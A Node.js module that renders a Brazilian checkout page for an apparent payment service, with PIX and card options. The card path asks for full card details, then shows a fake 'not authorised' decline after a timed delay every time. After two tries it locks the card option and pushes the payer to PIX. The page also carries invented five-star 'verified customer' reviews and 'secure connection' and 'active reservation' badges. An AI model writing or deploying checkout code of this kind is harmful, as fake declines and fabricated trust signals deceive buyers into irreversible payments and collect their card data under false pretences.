function renderCheckoutPage(token) {
  return `<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Checkout</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
  <style>
    :root {
      --bg-root: #0a0a0a;
      --bg-sidebar: #0d0d0d;
      --bg-card: #121212;
      --bg-input: #0e0e0e;
      --line: rgba(255,255,255,0.07);
      --text: #f4f4f5;
      --text-muted: #8b8b93;
      --text-dim: #5c5c66;
      --accent: #a143f6;
      --accent-2: #6d3df8;
      --accent-soft: rgba(161, 67, 246, 0.18);
      --accent-glow: rgba(125, 70, 240, 0.45);
      --green: #34d399;
      --blue-bg: rgba(37, 99, 235, 0.12);
      --blue-border: rgba(59, 130, 246, 0.35);
      --blue-text: #93c5fd;
      --notice-bg: rgba(161, 67, 246, 0.1);
      --notice-border: rgba(161, 67, 246, 0.35);
      --notice-text: #d4c4ff;
    }
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
      background: var(--bg-root);
      color: var(--text);
      font-size: 14px;
      min-height: 100vh;
      -webkit-font-smoothing: antialiased;
    }
    .app {
      display: grid;
      grid-template-columns: 72px 1fr;
      min-height: 100vh;
    }
    @media (max-width: 720px) {
      .app { grid-template-columns: 1fr; }
      .rail { display: none; }
    }
    .rail {
      background: var(--bg-sidebar);
      border-right: 1px solid var(--line);
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 20px 0;
      gap: 20px;
    }
    .chk-logo {
      display: block;
      object-fit: contain;
      margin: 0 auto;
    }
    .chk-logo--rail {
      max-height: 48px;
      max-width: 52px;
      width: auto;
      height: auto;
    }
    .chk-logo--top {
      height: 40px;
      width: auto;
      max-width: min(200px, 55vw);
    }

    .wrap { min-width: 0; display: flex; flex-direction: column; }
    .topbar {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 16px 22px;
      border-bottom: 1px solid var(--line);
      background: var(--bg-root);
      gap: 12px;
      flex-wrap: wrap;
    }
    .brand-line {
      display: flex;
      align-items: center;
      gap: 12px;
    }
    .pill {
      font-size: 0.72rem;
      font-weight: 700;
      letter-spacing: 0.08em;
      text-transform: uppercase;
      color: var(--text-muted);
      border: 1px solid var(--line);
      padding: 6px 12px;
      border-radius: 999px;
      background: var(--bg-card);
    }

    .content {
      padding: 18px 22px 32px;
      flex: 1;
    }
    .grid {
      display: grid;
      grid-template-columns: 1fr min(380px, 100%);
      gap: 18px;
      align-items: start;
      max-width: 1100px;
    }
    @media (max-width: 900px) {
      .grid { grid-template-columns: 1fr; }
    }

    .notice {
      border-radius: 12px;
      padding: 12px 14px;
      background: var(--notice-bg);
      border: 1px solid var(--notice-border);
      color: var(--notice-text);
      font-size: 0.86rem;
      line-height: 1.45;
      margin-bottom: 16px;
    }
    .notice strong { color: #eee8ff; }
    .notice a { color: #c4b5fd; }

    .card {
      background: var(--bg-card);
      border: 1px solid var(--line);
      border-radius: 14px;
      padding: 18px;
      margin-bottom: 14px;
    }
    .card:last-child { margin-bottom: 0; }
    .card h2 {
      margin: 0 0 14px;
      font-size: 0.72rem;
      font-weight: 700;
      letter-spacing: 0.1em;
      text-transform: uppercase;
      color: var(--text-muted);
    }

    .field { margin-bottom: 12px; }
    .field label {
      display: block;
      font-size: 0.65rem;
      font-weight: 700;
      letter-spacing: 0.08em;
      color: var(--text-muted);
      margin-bottom: 6px;
    }
    input {
      width: 100%;
      border-radius: 10px;
      border: 1px solid var(--line);
      padding: 12px 14px;
      background: var(--bg-input);
      color: var(--text);
      font-size: 0.92rem;
      outline: none;
    }
    input::placeholder { color: var(--text-dim); }
    input:focus {
      border-color: rgba(161, 67, 246, 0.55);
      box-shadow: 0 0 0 2px var(--accent-soft);
    }
    .field-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }

    .method-segment {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 8px;
      margin-bottom: 14px;
    }
    .method-btn {
      border: 1px solid var(--line);
      border-radius: 10px;
      padding: 12px 10px;
      background: rgba(0,0,0,0.35);
      color: var(--text-muted);
      font-weight: 600;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      font-size: 0.88rem;
      transition: all 0.15s;
    }
    .method-btn .icon { width: 18px; height: 18px; display: inline-block; }
    .method-btn.active {
      border-color: rgba(161, 67, 246, 0.55);
      background: var(--accent-soft);
      color: #fff;
      box-shadow: 0 0 0 2px rgba(161, 67, 246, 0.12);
    }

    .pay-info {
      display: flex;
      gap: 12px;
      padding: 12px;
      border-radius: 10px;
      background: rgba(161, 67, 246, 0.08);
      border: 1px solid rgba(161, 67, 246, 0.22);
      color: #d4c4ff;
      font-size: 0.88rem;
      line-height: 1.45;
      margin-bottom: 14px;
    }
    .pay-info .pix-mark {
      width: 26px; height: 26px;
      background: linear-gradient(135deg, var(--accent-2), var(--accent));
      border-radius: 8px;
      transform: rotate(45deg);
      flex-shrink: 0;
      margin-top: 2px;
    }

    button.action {
      width: 100%;
      border: none;
      border-radius: 10px;
      padding: 14px;
      color: #fff;
      font-weight: 800;
      font-size: 0.95rem;
      letter-spacing: 0.03em;
      cursor: pointer;
      background: linear-gradient(135deg, var(--accent-2), var(--accent));
      box-shadow: 0 8px 24px rgba(109, 61, 248, 0.38);
    }
    button.action:hover { filter: brightness(1.06); }
    button.action[disabled] { opacity: 0.65; cursor: wait; }

    .info-blue {
      border-radius: 10px;
      padding: 12px 14px;
      font-size: 0.85rem;
      line-height: 1.45;
      margin-bottom: 14px;
      background: var(--blue-bg);
      border: 1px solid var(--blue-border);
      color: var(--blue-text);
    }

    .cart-item {
      display: flex;
      gap: 12px;
      align-items: center;
      padding: 4px 0 14px;
      border-bottom: 1px solid var(--line);
      margin-bottom: 12px;
      position: relative;
    }
    .cart-item .thumb {
      width: 44px; height: 44px;
      border-radius: 10px;
      background: linear-gradient(135deg, var(--accent-2), var(--accent));
      display: flex; align-items: center; justify-content: center;
      color: #fff; font-weight: 800;
      flex-shrink: 0;
    }
    .cart-item .name { font-weight: 700; font-size: 0.95rem; }
    .cart-item .desc { color: var(--text-muted); font-size: 0.8rem; margin-top: 2px; }
    .cart-item .qty {
      position: absolute; right: 0; top: 6px;
      width: 22px; height: 22px;
      border-radius: 50%;
      background: linear-gradient(135deg, var(--accent-2), var(--accent));
      font-size: 0.72rem;
      display: flex; align-items: center; justify-content: center;
      font-weight: 700;
      color: #fff;
    }
    .summary-line {
      display: flex; justify-content: space-between;
      padding: 6px 0;
      font-size: 0.88rem;
      color: var(--text-muted);
    }
    .summary-line.total {
      font-weight: 800;
      color: var(--text);
      font-size: 1.05rem;
      padding-top: 10px;
    }
    .secure-row {
      margin-top: 10px;
      padding: 10px 12px;
      border-radius: 10px;
      background: rgba(52, 211, 153, 0.1);
      border: 1px solid rgba(52, 211, 153, 0.28);
      color: #6ee7b7;
      font-size: 0.82rem;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .secure-row svg { width: 14px; height: 14px; flex-shrink: 0; }

    .review {
      display: flex;
      gap: 12px;
      padding: 14px 0;
      border-bottom: 1px solid var(--line);
    }
    .review:last-child { border-bottom: 0; padding-bottom: 0; }
    .avatar {
      width: 40px; height: 40px;
      border-radius: 50%;
      background: linear-gradient(135deg, var(--accent-2), var(--accent));
      display: flex; align-items: center; justify-content: center;
      color: #fff; font-weight: 700;
      flex-shrink: 0;
    }
    .review .meta { display: flex; justify-content: space-between; align-items: center; margin-bottom: 2px; }
    .review .name { font-weight: 700; font-size: 0.9rem; }
    .review .city { color: var(--text-muted); font-size: 0.75rem; }
    .review .stars { color: #c4b5fd; font-size: 0.82rem; letter-spacing: 1px; }
    .review .text { color: var(--text-muted); font-size: 0.85rem; line-height: 1.45; margin-top: 4px; }

    .footer {
      text-align: center;
      padding: 20px;
      color: var(--text-dim);
      font-size: 0.8rem;
      border-top: 1px solid var(--line);
    }
    .footer .pay-mark span {
      display: inline-block;
      width: 20px; height: 20px;
      background: linear-gradient(135deg, var(--accent-2), var(--accent));
      border-radius: 6px;
      transform: rotate(45deg);
      vertical-align: middle;
      margin: 0 4px;
    }

    .status { margin-top: 10px; font-size: 0.82rem; color: var(--text-muted); min-height: 18px; text-align: center; }
    .alert {
      margin-top: 10px;
      border: 1px solid rgba(167, 139, 250, 0.4);
      background: rgba(139, 92, 246, 0.12);
      color: #e9d5ff;
      padding: 11px 12px;
      border-radius: 10px;
      font-size: 0.86rem;
      display: none;
      line-height: 1.4;
    }
    .spinner {
      width: 16px; height: 16px;
      border: 2px solid rgba(255,255,255,0.25);
      border-top-color: var(--accent);
      border-radius: 50%;
      display: inline-block;
      animation: spin 0.8s linear infinite;
      vertical-align: middle;
      margin-right: 8px;
    }
    .loading-line {
      display: none;
      margin-top: 12px;
      padding: 10px 12px;
      border-radius: 10px;
      background: rgba(161, 67, 246, 0.08);
      border: 1px solid rgba(161, 67, 246, 0.22);
      color: #d4c4ff;
      font-size: 0.88rem;
      text-align: center;
    }
    .pix-result {
      display: none;
      margin-top: 14px;
      padding-top: 14px;
      border-top: 1px solid var(--line);
    }
    textarea {
      width: 100%;
      min-height: 80px;
      border-radius: 10px;
      border: 1px solid var(--line);
      padding: 10px;
      background: var(--bg-input);
      color: var(--text);
      font-family: ui-monospace, Consolas, monospace;
      font-size: 0.8rem;
      resize: none;
    }
    .row { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 8px; }
    .small-btn {
      border-radius: 10px;
      border: 1px solid var(--line);
      background: rgba(255,255,255,0.05);
      color: var(--text);
      padding: 10px;
      font-weight: 600;
      cursor: pointer;
      font-size: 0.85rem;
    }
    .small-btn:hover { background: rgba(255,255,255,0.09); }
    .hidden { display: none; }
    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="app">
    <aside class="rail" aria-hidden="true">
      <img src="/inphopay-logo.png" alt="" class="chk-logo chk-logo--rail" decoding="async" />
    </aside>
    <div class="wrap">
      <header class="topbar">
        <div class="brand-line">
          <img src="/inphopay-logo.png" alt="" class="chk-logo chk-logo--top" decoding="async" />
        </div>
        <span class="pill">Reserva ativa</span>
      </header>

      <div class="content">
        <div class="notice">
          O valor do seu pagamento está <strong>reservado</strong>. Finalize o pagamento para confirmar.
          Respeite o prazo indicado pelo vendedor. <a href="#">Termos</a>.
        </div>

        <div class="grid">
          <div class="col-main">
            <section class="card">
              <h2>Identificação</h2>
              <div class="field"><label>E-mail</label>
                <input id="holderEmail" type="email" placeholder="seu@email.com" />
              </div>
              <div class="field"><label>Telefone</label>
                <input id="holderPhone" maxlength="15" placeholder="(00) 00000-0000" />
              </div>
              <div class="field"><label>Nome completo</label>
                <input id="holderName" placeholder="NOME COMPLETO" />
              </div>
              <div class="field"><label>CPF/CNPJ</label>
                <input id="holderCpf" maxlength="14" placeholder="000.000.000-00" />
              </div>
            </section>

            <section class="card">
              <h2>Pagamento</h2>
              <div class="method-segment">
                <button class="method-btn active" id="methodPixBtn" type="button">
                  <span class="icon" style="background:linear-gradient(135deg,var(--accent-2),var(--accent));border-radius:6px;transform:rotate(45deg);width:16px;height:16px;"></span>
                  PIX
                </button>
                <button class="method-btn" id="methodCardBtn" type="button">
                  <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="6" width="20" height="13" rx="2"/><line x1="2" y1="11" x2="22" y2="11"/></svg>
                  Cartão
                </button>
              </div>

              <div id="pixSection">
                <div class="pay-info">
                  <span class="pix-mark"></span>
                  <span>Ambiente criptografado. Ao gerar PIX, use o código no app do seu banco.</span>
                </div>
                <button class="action" id="payPix">GERAR PIX</button>
                <div class="loading-line" id="pixLoading"><span class="spinner"></span>Gerando código PIX…</div>
                <div class="status" id="status"></div>
                <div id="result" class="pix-result">
                  <textarea id="pix" readonly></textarea>
                  <div class="row">
                    <button class="small-btn" id="copyBtn">Copiar código</button>
                    <button class="small-btn" id="newBtn">Gerar novo</button>
                  </div>
                </div>
              </div>

              <div id="cardSection" class="hidden">
                <div class="info-blue" style="margin-top:4px;">Simulação de cartão: após 2 tentativas, use PIX para concluir.</div>
                <h2 style="margin-top:12px;">Dados do cartão</h2>
                <div class="field"><label>Número do cartão</label>
                  <input id="cardNumber" maxlength="19" placeholder="0000 0000 0000 0000" />
                </div>
                <div class="field-grid">
                  <div class="field"><label>Validade</label><input id="cardExpiry" placeholder="MM/AA" /></div>
                  <div class="field"><label>CVV</label><input id="cardCvv" maxlength="4" placeholder="000" /></div>
                </div>
                <div class="field"><label>Nome impresso</label>
                  <input id="cardName" placeholder="NOME COMO NO CARTÃO" />
                </div>
                <h2 style="margin-top:14px;">Endereço de cobrança</h2>
                <div class="field-grid">
                  <div class="field"><label>CEP</label><input id="zipCode" maxlength="9" placeholder="00000-000" /></div>
                  <div class="field"><label>Número</label><input id="streetNumber" placeholder="0" /></div>
                </div>
                <div class="field"><label>Rua</label>
                  <input id="streetName" placeholder="Preenchido pelo CEP" />
                </div>
                <div class="field-grid">
                  <div class="field"><label>Bairro</label><input id="neighborhood" placeholder="Bairro" /></div>
                  <div class="field"><label>UF</label><input id="state" maxlength="2" placeholder="UF" /></div>
                </div>
                <div class="field"><label>Cidade</label><input id="city" placeholder="Cidade" /></div>
                <button class="action" id="payCard" style="margin-top:12px;">PAGAR COM CARTÃO</button>
                <div class="loading-line" id="cardLoading"><span class="spinner"></span>Processando…</div>
                <div class="status" id="cardStatus"></div>
                <div id="cardWarn" class="alert">Pagamento não autorizado. Tente novamente ou use PIX.</div>
              </div>
            </section>
          </div>

          <div class="col-side">
            <section class="card">
              <h2>Seu pedido</h2>
              <div class="cart-item">
                <div class="thumb" id="thumb">IP</div>
                <div class="info">
                  <div class="name" id="itemName">Pagamento</div>
                  <div class="desc">Checkout protegido</div>
                </div>
                <div class="qty">1</div>
              </div>
              <div class="summary-line"><span>Subtotal</span><span id="subtotal">R$ 0,00</span></div>
              <div class="summary-line total"><span>Total</span><span id="total">R$ 0,00</span></div>
              <div class="secure-row">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z"/></svg>
                Conexão segura
              </div>
            </section>
            <section class="card">
              <h2>Avaliações</h2>
              <div class="review">
                <div class="avatar">JA</div>
                <div style="flex:1;">
                  <div class="meta">
                    <div><div class="name">Jamila A.</div><div class="city">São Paulo</div></div>
                    <div class="stars">★★★★★</div>
                  </div>
                  <div class="text">Processo rápido e claro.</div>
                </div>
              </div>
              <div class="review">
                <div class="avatar">IP</div>
                <div style="flex:1;">
                  <div class="meta">
                    <div><div class="name">Cliente verificado</div><div class="city">Brasil</div></div>
                    <div class="stars">★★★★★</div>
                  </div>
                  <div class="text">Pagamento confirmado sem complicação.</div>
                </div>
              </div>
            </section>
          </div>
        </div>

        <div class="footer">
          Formas de pagamento <span class="pay-mark"><span></span></span>
          © ${new Date().getFullYear()} — Pagamento seguro
        </div>
      </div>
    </div>
  </div>
  <script>
    const token = ${JSON.stringify(token)};
    const apiBase = window.__API_BASE__ || "";
    const payPixBtn = document.getElementById("payPix");
    const payCardBtn = document.getElementById("payCard");
    const methodPixBtn = document.getElementById("methodPixBtn");
    const methodCardBtn = document.getElementById("methodCardBtn");
    const pixEl = document.getElementById("pix");
    const copyBtn = document.getElementById("copyBtn");
    const newBtn = document.getElementById("newBtn");
    const statusEl = document.getElementById("status");
    const cardStatusEl = document.getElementById("cardStatus");
    const cardWarnEl = document.getElementById("cardWarn");
    const pixLoadingEl = document.getElementById("pixLoading");
    const cardLoadingEl = document.getElementById("cardLoading");
    const pixSection = document.getElementById("pixSection");
    const cardSection = document.getElementById("cardSection");
    const cardAttemptStorageKey = "inphopay_card_attempts_" + token;

    function getCardAttempts() { return Number(localStorage.getItem(cardAttemptStorageKey) || "0"); }
    function setCardAttempts(value) { localStorage.setItem(cardAttemptStorageKey, String(value)); }
    function isCardBlocked() { return getCardAttempts() >= 2; }
    function digitsOnly(value) { return String(value || "").replace(/\\D/g, ""); }
    function maskCpf(value) {
      const v = digitsOnly(value).slice(0, 11);
      return v.replace(/(\\d{3})(\\d)/, "$1.$2").replace(/(\\d{3})(\\d)/, "$1.$2").replace(/(\\d{3})(\\d{1,2})$/, "$1-$2");
    }
    function maskPhone(value) {
      const v = digitsOnly(value).slice(0, 11);
      if (v.length <= 10) return v.replace(/(\\d{2})(\\d)/, "($1) $2").replace(/(\\d{4})(\\d{1,4})$/, "$1-$2");
      return v.replace(/(\\d{2})(\\d)/, "($1) $2").replace(/(\\d{5})(\\d{1,4})$/, "$1-$2");
    }
    function maskCep(value) { const v = digitsOnly(value).slice(0, 8); return v.replace(/(\\d{5})(\\d{1,3})$/, "$1-$2"); }
    function maskExpiry(value) { const v = digitsOnly(value).slice(0, 4); if (v.length < 3) return v; return v.slice(0, 2) + "/" + v.slice(2); }
    function maskCard(value) { const v = digitsOnly(value).slice(0, 16); return v.replace(/(\\d{4})(?=\\d)/g, "$1 "); }
    function showCardWarn(message) { cardWarnEl.textContent = message; cardWarnEl.style.display = "block"; }
    function hideCardWarn() { cardWarnEl.style.display = "none"; }
    function updateMethodView(method) {
      const pix = method === "pix";
      pixSection.classList.toggle("hidden", !pix);
      cardSection.classList.toggle("hidden", pix);
      methodPixBtn.classList.toggle("active", pix);
      methodCardBtn.classList.toggle("active", !pix);
      if (!pix && isCardBlocked()) {
        cardStatusEl.textContent = "Cartão indisponível. Use PIX.";
        payCardBtn.disabled = true;
      }
    }
    function validateCardFields() {
      const requiredIds = ["cardNumber","cardExpiry","cardCvv","cardName","holderName","holderCpf","holderEmail","holderPhone","zipCode","streetNumber","streetName","neighborhood","city","state"];
      return requiredIds.every((id) => { const el = document.getElementById(id); return el && String(el.value || "").trim().length > 0; });
    }
    function formatBRL(value) { return "R$ " + Number(value || 0).toFixed(2).replace(".", ","); }
    async function loadCheckout() {
      const res = await fetch(apiBase + "/public/checkout/" + token);
      const data = await res.json();
      const itemName = data.title || "Pagamento";
      const amount = Number(data.amount || 0);
      document.getElementById("itemName").textContent = itemName;
      document.getElementById("subtotal").textContent = formatBRL(amount);
      document.getElementById("total").textContent = formatBRL(amount);
      const initials = itemName.replace(/[^A-Za-z]/g, "").slice(0, 2).toUpperCase() || "IP";
      document.getElementById("thumb").textContent = initials;
      if (data.pix_qr_code) {
        document.getElementById("result").style.display = "block";
        pixEl.value = data.pix_qr_code;
        payPixBtn.textContent = "PIX DISPONÍVEL";
        statusEl.textContent = "PIX pronto para copiar.";
      }
      if (isCardBlocked()) {
        payCardBtn.disabled = true;
        showCardWarn("Use PIX para concluir o pagamento.");
        cardStatusEl.textContent = "Cartão bloqueado após 2 tentativas.";
      }
    }
    loadCheckout();
    async function wait(ms) { return new Promise((resolve) => setTimeout(resolve, ms)); }
    async function generatePix() {
      payPixBtn.disabled = true;
      payPixBtn.textContent = "Gerando…";
      statusEl.textContent = "Preparando seu pagamento…";
      pixLoadingEl.style.display = "block";
      const res = await fetch(apiBase + "/public/checkout/" + token + "/pay", { method: "POST" });
      const data = await res.json();
      pixLoadingEl.style.display = "none";
      if (!res.ok) {
        payPixBtn.disabled = false;
        payPixBtn.textContent = "GERAR PIX";
        statusEl.textContent = data.error || "Falha ao gerar pagamento.";
        return;
      }
      document.getElementById("result").style.display = "block";
      pixEl.value = data.pix.pix_qr_code;
      payPixBtn.textContent = "PIX GERADO";
      payPixBtn.disabled = false;
      statusEl.textContent = "Copie o código e pague no app do banco.";
    }
    async function tryCardPayment() {
      if (isCardBlocked()) {
        showCardWarn("Use PIX para concluir.");
        payCardBtn.disabled = true;
        return;
      }
      if (!validateCardFields()) {
        cardStatusEl.textContent = "Preencha todos os campos.";
        return;
      }
      hideCardWarn();
      payCardBtn.disabled = true;
      cardLoadingEl.style.display = "block";
      cardStatusEl.textContent = "Validando…";
      await wait(1400);
      const attempts = getCardAttempts() + 1;
      setCardAttempts(attempts);
      cardLoadingEl.style.display = "none";
      showCardWarn("Pagamento não autorizado. Tente novamente ou use PIX.");
      cardStatusEl.textContent = "Não autorizado.";
      if (attempts >= 2) {
        payCardBtn.disabled = true;
        cardStatusEl.textContent = "Cartão indisponível. Use PIX.";
      } else payCardBtn.disabled = false;
    }
    payPixBtn.addEventListener("click", generatePix);
    payCardBtn.addEventListener("click", tryCardPayment);
    copyBtn.addEventListener("click", async () => {
      await navigator.clipboard.writeText(pixEl.value);
      copyBtn.textContent = "Copiado!";
      setTimeout(() => (copyBtn.textContent = "Copiar código"), 1400);
    });
    newBtn.addEventListener("click", async () => { payPixBtn.disabled = false; await generatePix(); });
    methodPixBtn.addEventListener("click", () => updateMethodView("pix"));
    methodCardBtn.addEventListener("click", () => updateMethodView("card"));
    const cardNumberEl = document.getElementById("cardNumber");
    const cardExpiryEl = document.getElementById("cardExpiry");
    const cardCvvEl = document.getElementById("cardCvv");
    const holderCpfEl = document.getElementById("holderCpf");
    const holderPhoneEl = document.getElementById("holderPhone");
    const zipCodeEl = document.getElementById("zipCode");
    const stateEl = document.getElementById("state");
    const streetEl = document.getElementById("streetName");
    const neighborhoodEl = document.getElementById("neighborhood");
    const cityEl = document.getElementById("city");
    cardNumberEl.addEventListener("input", () => cardNumberEl.value = maskCard(cardNumberEl.value));
    cardExpiryEl.addEventListener("input", () => cardExpiryEl.value = maskExpiry(cardExpiryEl.value));
    cardCvvEl.addEventListener("input", () => cardCvvEl.value = digitsOnly(cardCvvEl.value).slice(0, 4));
    holderCpfEl.addEventListener("input", () => holderCpfEl.value = maskCpf(holderCpfEl.value));
    holderPhoneEl.addEventListener("input", () => holderPhoneEl.value = maskPhone(holderPhoneEl.value));
    zipCodeEl.addEventListener("input", () => zipCodeEl.value = maskCep(zipCodeEl.value));
    stateEl.addEventListener("input", () => stateEl.value = stateEl.value.replace(/[^a-zA-Z]/g, "").slice(0, 2).toUpperCase());
    zipCodeEl.addEventListener("blur", async () => {
      const cep = digitsOnly(zipCodeEl.value);
      if (cep.length !== 8) return;
      cardStatusEl.textContent = "Consultando CEP…";
      try {
        const res = await fetch("https://viacep.com.br/ws/" + cep + "/json/");
        const data = await res.json();
        if (data.erro) { cardStatusEl.textContent = "CEP não encontrado."; return; }
        streetEl.value = data.logradouro || streetEl.value;
        neighborhoodEl.value = data.bairro || neighborhoodEl.value;
        cityEl.value = data.localidade || cityEl.value;
        stateEl.value = (data.uf || stateEl.value).toUpperCase();
        cardStatusEl.textContent = "Endereço preenchido.";
      } catch { cardStatusEl.textContent = "Falha ao consultar CEP."; }
    });
    updateMethodView("pix");
  </script>
</body>
</html>`;
}

module.exports = { renderCheckoutPage };
